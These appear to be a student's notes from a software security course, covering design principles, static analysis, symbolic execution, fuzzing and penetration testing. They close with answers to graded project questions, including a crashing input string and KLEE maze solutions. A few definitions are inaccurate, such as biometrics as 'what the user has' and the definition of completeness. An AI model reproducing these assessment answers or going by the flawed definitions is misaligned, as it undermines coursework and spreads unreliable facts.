    * Could sniff the network.
    * Could run multiple sessions.
    * Could send duplicate messages.
    * Could enter invalid data.
  * Snooping user
    * Sniff / replay / duplicate messages.
    * Hijack sessions
  * Co-located user (multiple users on the same machine)
    * Read/write files
    * Snoop keypress (steal password)

* IPSec vs SSL (application level)
* Don't make bad assumptions!
  * SSL is not completely safe. A user can sniff message length, can perform pattern matching, and can monitor time between messages.

### Video 3 : Security Requirements

* Security requirements - security related goals
  * Passwords must be strong, stored encrypted.
* Kinds of requirements
  * Confidentiality
    * Privacy
    * Anonymity
  * Integrity
  * Availability
* Supporting mechanisms
  * Authentication
  * Authorization
  * Auditability

* Privacy (individuals) / Confidentiality (data)
  * Also known as secrecy.
  * Sensitive information is not leaked.
  * A "direct leak" happens when actual data is leaked.
  * A side channel is not a direct data leak, however information is revealed via
    actions of the system. (e.g., an attacker knows a username exists on the system because it takes the system
    longer to respond with failure when compared to a username that does not exist on the system).
* Integrity
  * Sensitive information should *not be damaged*. User A cannot alter data for User B.
  * Direct - the system allows user A to alter user B's data.
  * Indirect - trick the system into doing something.
* Availability
  * DDOS

* Leslie Lamport coined "The Gold Standard" : Authentication / Authorization / Audit (AU == GOLD
  * Authentication : identification. Is the user the real user?
    * Password (what the user knows)
    * Biometric (what the user has)
    * Smartphone (what the user has)
    * Multi-factor auth : you must have a password as well as a cell phone, for example.
  * Authorization
    * Determine what security policy is enfoced - what the user can do.
  * Audit
    * Determine if a breach occurred.
    * Log files / pattern matching.

* Defining security requirements
  * What do you want to protect? Risk vs. cost analysis of a breach.
  * Define abuse cases - what the system should *not* do - i.e., a user cannot login as another user.

### Video 4 : Design Flaws

* Flaws : problems with design.
* Bugs : problems with implementation.

* Getting the design right is crucial.

* Design decisions
  * High level : Processes / interactions / programming languages / tools.
  * Next level : Decomposing the system into modules.
  * Low level : Data types, functions, functional patterns.

* Once you have the design, perform a risk based analysis.
* What are your principles?
  * Principle groups
    * Prevention : eliminate bugs entirely (i.e., heartbleed could use java to prevent against buffer overflows)
    * Mitigation : Reduce the harm if a bugs happens (i.e., run our app in multiple browser processes to limit the attack)
    * Detection (Recovery) : Identify and understand an attack.

Principles:
  * Favor simplicity.
  * Trust with reluctance.
  * Use community resources - no security by obscurity.
  * Monitor and trace.

### Video 5 : Favor Simplicity

* Goal : prevent bugs!
* Keep it so simple that it is obviously correct.

* Use fail-safe defaults.
  * Length of cryptographic keys.
  * No default password (wifi router hardware).
  * Whitelist rather than blacklist.

* Do not expect expert users.
  * Target the least sophisticated users.
  * Don't have users make frequent decisions (may just accept the defaults).
  * Allow users to see how the public might be able to view their data with their current security configuration.

* Passwords
  * Goal : easy to remember, hard to guess.
  * Repeat passwords (use same password on different sites).

* Password Manager
  * Benefits : single password.

* Password strength meter. Users should not be able to use weak password.

### Video 6 : Trust with reluctance

* Improve security by reducing the number of parts.
  * Use OSS libraries, don't roll your own.
  * Use Java rather than C.

* Maintain a small trusted computing base (small footprint). Smaller is better.
  * Example : minimize the attack space. For example, use containers.

* Use the principle of east privilege to limit power.

* Lesson : trust is transitive. If your program uses another application, you trust that application.
* Rule : Input validation.
* Principle : Promote privacy.
  * Restrict the flow of sensitive information.

* Seccomp : linux system call that compartmentalizes (sandboxes) a process and limits the system calls it can perform.
* Chrome, OpenSSH, vsftpd, others use seccomp.
  * Chrome will run flash in a sandbox, giving it very limited permissions on what it can perform.

### Video 7 : Defense in Depth / Monitoring & Traceability

* Defense in depth - multiple layers of security. If one layer fails, another layer will reduce or limit the attack.
  * Firewall
  * Encrypt all sensitive data (passwords, etc).

* Assume that your system can be compromised and limit what information can be taken.
* Use community resources (OSS) - especially crypto - it's hard.
* Vet designs publically. No security by obscurity.

* Monitoring / Traceability
  * Acknowledge that systems will be breached.
  * Determine how an attack has been compromised and determine what data was stolen.

### Video 8 : Top Design Flaws

* Don't validate data.
* Don't use crypto correctly.
* Integrate external components w/o understanding their attack space.

* Authentication bypass
  * Clients coerced to accept invalid SSL certificates.
  * Web browsers should *not* allow a user to use the site without a strict warning.
  * Don't turn off SSL validation during development.
  * Make session timeouts short.

* Use crypto correctly.
  * Don't roll your own crypto.
  * Use OSS software.
  * Hashing protects integrity but not confidentiality.
  * Use large keys. Protect keys.

* Which data sources require protection?
  * i.e., user location data.
  * Think about when the data is stored and moved. Protect it.

* Use external components correctly!
  * 3rd party components increase your attack surface. Understand their impact on your system.

### Video 9 : Case Study VSFTPD

* Does anyone use FTP anymore? Please, don't do it!

* vsftpd uses secure strings. They wrote their own memory and string functions.
* They did a great job of being defensive and using secure practices.
* Just don't use C.
* They use minimal privilege. Always handled by non-root (seccomp) processes.

## Week 5 : Static Analysis / Symbolic Execution for Security

### Video 1 / 2 : Static Analysis

* Manual testing and code review is time consuming, expensive, and error prone (can't cover all code paths).
* Static analysis analyzes the code without running it.
* Drawbacks : can't test for functional problems.
* SA allows developers to focus on reasoning and higher level activities.

* The halting problem : can an analyser determine if a program will terminate? No. (not sure why)

* "perfect" static analysis is not possible.
* Static analysis is still very useful.

* Soundness : if the analyzer says that X is true, it is true.
* Complete : If X is true, then it really is.

* There are many tradeoffs:
  * Precision : minimizes false alarms.
  * Scalability : can analyze large programs.
  * Understandability : error reports should be actionable.

* **Code style is important** If the analyzer has a tough time analyzing code, the code is probably complex. Fix it.

### Video 3 : Flow analysis

* Tracks how values flow thru the program. Helps to predict when data is incorrectly used (printf).
* Tainted data - data could be controlled by an adversary.
* No tainted data flows:
  * Untainted data is trusted.
  * Tainted data is untrusted.
  * Flow analysis determines illegal flows : when a tainted source may flow to an untainted sink.
* Think of low analysis as a type of type inference.

### Video 4 : Flow Analysis : Adding Sensitivity

* Increase analysis precision.
* A flow sensitive analysis accounts for variables that change. A variable that
  was tainted could turn into untainted during execution.
* If *any* branch could taint and improperly use a variable, a good analyzer will catch it.
* "Path Sensitivity" walks all code paths. Even if a variable is tainted, if it's not used incorrectly within any possible code paths the variable could be used, the analyzer will not throw a warning.  

* Why *not* use flow/path sensitivity.
  * Performance is slow. (Don't buy this argument - clang's static analyzer is fast!)

### Video 5 : Context Sensitive Analysis

* How do we handle tainted flows across function calls?
* The analyzer needs to track flows across function calls.
* Context insensitive analysis treats call sites the same in all situations.
  * If you first pass a tainted variable to a function, it assumes all return values
    for that function will be tainted. This is not true - another call to the same
    function with untainted data should return untainted.
* Context sensitive analysis treats each call site differently (by line number where the function is called).
* Context sensitivity gives you more precision, but at a cost
  * O(n) for insensitive analysis, O(n3) for sensitive algorithms.

* How to increase scalability?
  * We could do *some* callsites as insensitive, others as sensitivity.
  * We could also limit the depth of sensitivity.

### Video 6 : Flow Analysis : Scaling it up to a complete language and problem set

* Problems could be missed when assignments are thru pointers (or aliases).
* Using **const** will help reduce alarms (and is just a good programming practice).

* Information flow analysis : tainted data could still be used when untainted data is expected.
  * Example : tainted data, thru a pointer, is copied to an untainted variable, thus the new pointer is untainted. The call graph satisfies analysis constraints, however the data is leaked.
  * Information flow analysis checks to determine if tainted data has influenced untainted data.

* Information flow could lead to false alarms.
* Tainting analysis tend to *not* track implicit flows.

### Video 7 : Challenges and Variation

* Function pointers aren't assigned until runtime.
  * The analyzer **could** detect flows by analyzing **all** possible function values.
* Structs or objects:
  * Track taintedness of each field? Or entire struct?

* Array
  * Track each element in an array, or the entire array itself.

* Trait analysis could handle sanitizers, which turn tainted data into untainted data.

* Pointer ("point-to") analysis:
  * Determines if pointers point to the same location.

* Data Flow Analysis
  * Focuses on flow of variables thru a program. "Liveness" is tracked for each variable.

* Abstract Interpretation
  * The goal of abstract interpretation is to disregard as much information about the program as possible impacting the analysis results.


### Video 8 : Introducing Symbolic Execution

* Why are bugs not found?
  * Rare features, not tested, non-deterministic.

* How to find all bugs?
  * Static analysis tools - SA runs all possible code paths.
  * Can SA find all bugs?
    * No. The analyzer doesn't know *how* the program should work.

* Symbolic execution : a middle ground between testing and static analysis.
  * Test values are replaced with symbols to test all possible values the symbol could be.
  * SE is like unit tests on steriods since one test could test all branches of a function.
  * SE can analyze a program to test all branches by using symbols which take each branch.

* SE can't test *all* paths (since programs have an infinite set of paths).
* SE can be considered as path, flow, context senstivity in static analysis terms.

### Video 9 : Symbolic Execution : A Little History

* First proposed in mid-70s (James King PHD thesis)
* Why did SE *not* take off?
  * Compute intensive. Programs contain a lot of state.
  * iPads are fast as Cray-2 from the 80s.
  * Today, computers are **much** faster.

* SE is being used in security software today (since CPUs are much faster).

### Video 10 : Basic Symbolic Execution

* Expressions operate on symbols (variables). SE will provide a set of inputs for each variable.
* SE will then run test cases using each possible value (or a single value to satisfy each possible branch).
* SE then gives you test results for each branch.
* SE could be used to find code that is unreachable.
* SE maintains a task list. As it encounters new paths, it adds each branch to the task list.

* We also have to consider the libraries used in the app as well. They are huge!

* Concoilc execution - "dynamic symbolic execution".
  * Concolic execution runs the program normally, instrumenting it as it's executed to help determine which paths should be taken, which variables could be used as symbols, and which variables can be skipped.
  * Allows us to pick reasonably concrete values in some cases to speed up the solver.

### Video 11 : Symbolic Execution as Search, and the rise of solvers

* SE is simple and useful, but expensive.
* SE boils down to a search problem.
* SE can't run SE to exhaustion (too many paths - programs have exponential paths).
* SA will terminate but can lead to false alarms.
* How can we improve SE?
  * Depth vs breadth first search?
* We could use randomness - use depth first for a while, then switch to breadth.
  * Randomness is not reproducable. Keep a seed so you can restart using the same random value.

* Coverage guided heuristics:
  * Pick the next statement to execute based on parts of the program it hasn't seen before.

* SMT solvers are limited. There are simply too many paths to search.

### Video 12 : Symbolic Execution Systems

There are many SE systems available today.

* SE are having a resurgence.
  * SAGE : concolic executor developed at MS research. Finds bugs in file parsers (word, pdf, etc)
  * Used daily in windows, office, etc.
* KLEE :
  * SE for LLVM bitcode.
  * Uses fork to manage branches.
  * Mocks environment to stub out system calls.
  * KLEE was ran on coreutils (unix utils, etc). KLEE covers more lines than the manual case.
* Mayhem
  * Runs on binaries.
  * Automatically generates exploits when bugs are found.
* Mergepoint
  * Uses SA for complete code blocks. Falls back to SE for parts that are hard to analyze.
  * Found 11,000+ bugs in linux, even in highly tested code.

### SE SUMMARY
* SE is a way to generalize testing.
* SE is used in practice today to find security critical bugs in production code.
* SE will penetrate into the mainstream in the near future. Right now they are rather niche and not used.



## Week 6 : Penetration Testing

### Video 1 : Penetration Testing

Goal : find evidence of insecurity. Trying to exploit in systems prior to deployment.

* Typically carried out by a separate team to avoid developer bias / blindspots.
* Pen testers may have various level of access to the system.
* Pen testing started under time-sharing computer systems (multi-user).
* Def-con "capture the flag" tests have popularized PEN testing.

Benefits:
  * Penetration tests are generally reproducable (so you can be certain they are
    solved).
  * "Feel good" factor - makes developers feel like they have developed a solid
    system.

Drawbacks:
  * Pen testing doesn't catch everything - it depends on what the tester was
    trying to break.

* nmap (network probe)
* zap : proxy for probing, exploring.
* metasploit : tools for distributing exploits.
* Fuzz testing - corrupts data.

### Video 2 : Pen Testing

* Tools are built to look for common issues. Tools used depend on the domain
  you're targeting.

* How to pen test:

  * Understand the landscape. Figure out everything you can about the system :
    languages, frameworks, protocols, libraries, etc.

  * Web testing:
    * 70% of web hacking is just messing with parameters
    * 10% = default passwords
    * 10% = hidden files or directories (based on web server frameworks)
    * 10% = auth problems.

* Tools
  * nmap
    * network scans - ping test, tcp syn to 443/80
    * Probes to different ports that elicit different responses on different
      OSs. These probes reveal the underlying OS behind each host.
    * Can be configured to delay packets to avoid being noticed on the network.
  * Web proxy
    * zap : GUI based inspection / modification of captured packets.
      * Active scanning : attempts XSS, SQL injection, etc.
    * fuzzing
    * spider : explores a site to contruct a model of a structure.
  * metasploit
    * Allows you to create scripts for attacks.
    * Infrastructure for probing and distributing exploits.
    * The goal for metasploit is to get a command line running on the target machine.
    * Includes a pile of modules / scripts for keylogging, etc.

### Video 3 : Fuzz Testing - Techniques and Tools

Fuzz testing is the process of throwing random or semi-random data at a system
in attempt to exploit it. Fuzz testing is typically done at the whole
application level (i.e., the entire system is tested), however the fuzzing
concept could be done at any application or component boundary (even down to a
function boundary).

* Fuzzing : Random testing. Inputs are generated randomly.
  * Black box fuzzing. Generates random inputs to throw at the program.
  * Grammer based fuzzer. Generates input based on a grammar.
  * White box fuzzing. Program generates inputs based on the program being
    tested (sample data, etc).

* Fuzzing inputs
  * Mutation - takes legal input and mutates it.
  * Generational - tool generates an input from scratch (random or based on a grammar).
  * Combinational - generate, mutate, generate, mutate, repeat.

* Examples of fuzzers:
  * Radamsa : mutatation based fuzzer. Creates mutations based off of input and generates fuzz data.
  * Blab : grammar based fuzzer. Takes regexs and generates inputs.

* Network based fuzzing:
  * Sends messages to a server - attempting to replicate a protocol (or just
    throwing random requests at a server)
  * Man in the middle : mutating inputs exchanged between client / server.
  * SPKIE : network based fuzzer. Will provide most of the protocol being tested
    (HTTP) with the ability for the user to enter small pieces "payloads" into
    the data stream.

* Crashes due to memory corruption are difficult to track down. The crash may
  happen well after the memory is corrupted.
  * Address Sanitizer - will crash immedaiately when a buffer is overflowed or use-after-free.
    * Instruments the compiler to crash on array overruns, etc.
	* Valgrind memory tester will help detect memory corruption issues.

### Eric Eames (Fusion X) : Penetration Tester

Fusion X : penetration testing. Prefers "security accessment" term to "pen
tester".

* How do you pen test?
  * First, agree on the scope of the test / rules of engagement.
  * Next, figure out where the company is on the internet or the system.
  * Scanning / exploring the system.
  * Once you get data, use it to find new holes.

* What tools do you use / techniquest you employ to pen test?
  * Don't rush in with a scanner. You want to be quiet.
  * BURP suite. ZAP.
  * Metasploit auxiliary modules.
  * nmap (scaled back to avoid detection)

* Nessus (spelling?) - determine if a site is accessible. A test suite that will
  run a default set of tests against a site to look for known vulnerabilities.

* What are the common mistakes found during pen testing?
  * Default password.
  * SQL
  * XSS
  * Open SMB shares
  * Flat network - the open wifi is on the same network as internal machines.

* The hardest part of pen testing is finding the first entry into the
  system. Once you are in, you can typically grow your attack space.

* People underestimate other's access to their systems and overestimate their
  preventions in place.

* Outside groups have advantages just for being outside - is that correct?
  * Outsiders get more respect / more freedom. You are outside of the company's
    politics.

* Suprising things found during PEN testing?
  * Just opening up 443 and machines started connecting with auth credentials.
  * The days of opening up metasploit and exploiting a buffer overflow are gone.

* What other security tactics should be used outside of PEN testing?
  * Plan for defense in depth. Assume that someone will be compromised.
  * One compromise shouldn't crush the whole system.

* What are PEN testing limitations?
  * PEN testing is not exhaustive. They won't find all vulnerabilities.
  * Look for problems of process that allowed them to get to the exploit.

* Undergraduate education. Is undergrad do more to support PEN testing as an
  industry.
  * Certifications are not authoratative. People need experience.
  * The industry is changing fast. Certificates are not relevant.

* How has the PEN testing industry changed over time?
  * There are human reasons why security vulnerabilities happen. These continue
    to be problems.
  * People are not incentivized for having secure systems, so vulnerabilitie
    happen.

* The legislature has not been motivated enough to enforce secure policy. Even
  after Home Depot or Target they haven't updated their security policy.

* The organization and mindset must be security focused from the beginning.


### Partice Godefroid

http://research.microsoft.com/en-us/um/people/pg/

* Developed SAGE : white box fuzzer for security testing.

* What is your view on the state of the art of testing tools.
  * Static analysis tools.
  * Dynamic program tools - run the program and run checks during execution.

* What are the tools good for?
* Static analysis tools are fast, run during development.
* Dynamic tools are more precise but not exhaustive.

* Why white box fuzzing (SAGE)?
  * The goal is to exhaustively test data driven applications.
  * The most expensive bugs Microsoft faces are security related.
  * Microsoft has about 300 file parsers. Huge attack surface. Having fuzzing
    tools drastically helps test these file parsers.

* Three main types of fuzzing:

  * Black box fuzzing (early 2000s) : randomly switch bits in an input file.

  * Grammar based (~2005): grammar represents the input format. Fuzz uses the grammer
    to generate inputs. Drawback is you need a grammar. You need a good
    grammar. Expensive to develop a grammar.

  * White box fuzzing (~2006) : Run the app using symbolic execution with known
    inputs. Tests are generated from the. The tools suggest different inputs to
    trigger different codepaths. The tool is more complex but also more
    automatic.

* Seed files is a common practice when using fuzzing tools. They act as a
  starting point to generate more inputs.

* What roadblocks did you encounter when introducing tools into Microsoft
  product teams?
  * If the tools find bugs (add value), the tools will speak for themselves.
  * MS decided to invest in SAGE. SAGE was deployed within Windows 7 - was found
    to be effective in binary parsers. Sage found 1/3 of the file bugs in
    Windows 7.
  * Windows 7 centralized fuzzing. The app team provided interfaces to the
    fuzzing group, the fuzzing group would run the tests and provide bugs back
    to the development teams.

* How are things going to change in the next 5 years?
  * Trend : fuzzing as a service. Fuzzing can be outsourced.
  * Combining strengths of static / dynamic analysis tools.
    * Static - deep. Dynamic - no false alarms.
  * There is a need for fuzz testing to happen.

* Smartphone / browser applications open up new possibilities for tool
  automation.

* What problems are research teams currently working to solve?
  * SAGE is not finding bugs anymore. How do we verify code or provide complete
    coverage?
	* How do you expose SAGE to different domains (not file parsers) or more
      applications?


## Project 3

Symbolic executors are sometimes called "white box fuzz testers". Their goal is
to walk the entire tree, producing an exhaustive set of inputs for each branch
they encounter in the tree.

#### Question 1. Fuzzing.

How many iterations does it take the fuzzer to find the bug (i.e., record a
crash)?

> 1

What is the string that it discovers crashes the program?

> 255aaaaaaaa


#### Question 2 : Fuzzing alt2

Does fuzz.py identify a crash in wisdom-alt2? In how many iterations?

> No

#### Question 3 : Symbolically executing wisdom-alt2

Which symbolic variables were involved (AAAAAA and BBBBBB in the above)?
What was their contents (XXXXXXXX in the above)?

> AAAAAA == buf
> BBBBBB == r
> XXXXXXX == \x00\x00\x00\x00

$ ktest-tool.cde klee-last/test000001.ktest
ktest file : 'klee-last/test000001.ktest'
args       : ['wisdom-alt-sym.o']
num objects: 2
object    0: name: 'AAAAAA'
object    0: size: NN
object    0: data: 'XXXXXXXX'
object    1: name: 'BBBBBBB'
object    1: size: JJ
object    1: data: 'XXXXXXXX'

seed@seed-desktop:~/projects/3/klee-last$ ktest-tool.cde test000001.ktest
ktest file : 'test000001.ktest'
args       : ['wisdom-alt-sym.o']
num objects: 2
object    0: name: 'buf'
object    0: size: 20
object    0: data:
'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
object    1: name: 'r'
object    1: size: 4
object    1: data: '\x00\x00\x00\x00'

#### Question 4 : Symbolically executing the maze

$ ktest-tool.cde klee-last/test0000NN.ktest
ktest file : 'klee-last/test0000NN.ktest'
args       : ['maze-sym.o']
num objects: 1
object    0: name: 'program'
object    0: size: MM
object    0: data: 'XXXXXXXXXXXXXXXXXXXXXXXXX\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'

seed@seed-desktop:~/projects/3$ ktest-tool.cde klee-last/test000082.ktest
ktest file : 'klee-last/test000082.ktest'
args       : ['maze-sym.o']
num objects: 1
object    0: name: 'program'
object    0: size: 28
object    0: data: 'ssssddddwwaawwddddsddw\x00\x00\x00\x00\x00\x00'

What was the data (the XXXXetc. part, not including any \x00\x00 parts, if any) for the program object?

> ssssddddwwaawwddddsddw


It turns out there are multiple "solutions" to the maze; you can see them all by doing

$ klee.cde --emit-all-errors maze-sym.o
Then the ls command from above will show all the solutions. How many are there?

> 4

#### Question 5 : Walking thru walls

Are you surprised by the answer to question 4?

Something funny is going on: somehow the solution is allowed to walk through walls. Look through the code, and find the condition that allows this to happen. What line is it on? Comment it out and try again, to confirm you are getting just one solution.

```
110 > //If something is wrong do not advance
111 > if (maze[y][x] != ' '
112 >  /* &&
113 > !((y == 2 && maze[y][x] == '|' && x > 0 && x < W)) */)
114 > {
115 > x = ox;
116 > y = oy;
117 > }
```

> Like 112 or 113. Let's go with 113 for the official answer.
